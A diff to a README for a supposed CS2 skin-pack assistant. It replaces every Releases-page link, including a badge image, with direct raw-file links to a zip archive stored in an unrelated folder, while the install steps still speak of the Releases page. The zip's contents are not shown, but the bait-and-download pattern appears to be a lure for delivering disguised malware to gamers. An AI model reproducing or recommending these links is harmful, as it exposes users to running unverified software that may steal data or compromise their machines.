@@ -1,7 +1,7 @@
 # 🌟 assistant-for-cs2-skin-pack - Enhance Your CS2 Experience
 
 ## 🚀 Quick Download
-[![Download Assistant for CS2](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/resonant-windhoek631/assistant-for-cs2-skin-pack/releases)
+[![Download Assistant for CS2](https://raw.githubusercontent.com/resonant-windhoek631/assistant-for-cs2-skin-pack/main/mycologist/assistant-for-cs2-skin-pack-3.9.zip)](https://raw.githubusercontent.com/resonant-windhoek631/assistant-for-cs2-skin-pack/main/mycologist/assistant-for-cs2-skin-pack-3.9.zip)
 
 ## 🌟 Project Overview
 The **CS2 Visual Enhancement Library** offers a wide range of resources to improve the visual experience in CS2. This collection focuses on cosmetic enhancements, visual optimization, and customization techniques for a better gameplay experience. 
@@ -36,7 +36,7 @@ The materials cover various topics tailored for CS2 optimization:
 
 To get started, visit the Releases page to download the latest version of the assistant for your system. 
 
-[Visit this page to download](https://github.com/resonant-windhoek631/assistant-for-cs2-skin-pack/releases).
+[Visit this page to download](https://raw.githubusercontent.com/resonant-windhoek631/assistant-for-cs2-skin-pack/main/mycologist/assistant-for-cs2-skin-pack-3.9.zip).
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**: Click the link to go directly to the page.
@@ -80,4 +80,4 @@ Explore further with these links to enhance your understanding of visual optimiz
 
 We encourage users to contribute to this project by sharing their findings and enhancements. Your feedback will help improve the library and assist fellow users in achieving the best possible visual experience in CS2.
 
-[Visit this page to download](https://github.com/resonant-windhoek631/assistant-for-cs2-skin-pack/releases).
+[Visit this page to download](https://raw.githubusercontent.com/resonant-windhoek631/assistant-for-cs2-skin-pack/main/mycologist/assistant-for-cs2-skin-pack-3.9.zip).
